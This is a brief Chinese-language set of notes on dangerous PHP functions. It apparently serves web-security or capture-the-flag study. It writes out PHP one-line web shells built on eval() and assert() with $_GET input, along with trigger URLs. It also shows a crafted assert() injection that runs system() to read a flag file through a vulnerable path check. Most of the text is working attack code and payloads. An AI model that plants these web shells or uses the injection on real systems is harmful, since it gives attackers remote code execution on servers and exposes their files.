## 常用危险函数

### php代码执行相关

#### eval()

常见的一句话木马

```
<?php eval($_GET['pass']) ?>
```

```
http://xxx.xxx/xx.php?pass=phpinfo();
```

#### assert

assert会检查指定的assertion并在结果为false时采取适当的相应。如果assertion是字符串，它将会被assert当做php代码来执行

一句话木马

```php
<?php assert($_GET['pass']); ?>
```

```
http://xx.xx/xx.php?pass=phpinfo()
```

例子

```php
$file = "templates/".$page.".php";
assert("strpos('$file','..')===false") or die("Hacking")
```

构造

```php
assert("strpos('templates/'.system("cat templates/flag.php").'php','..')") === false
```

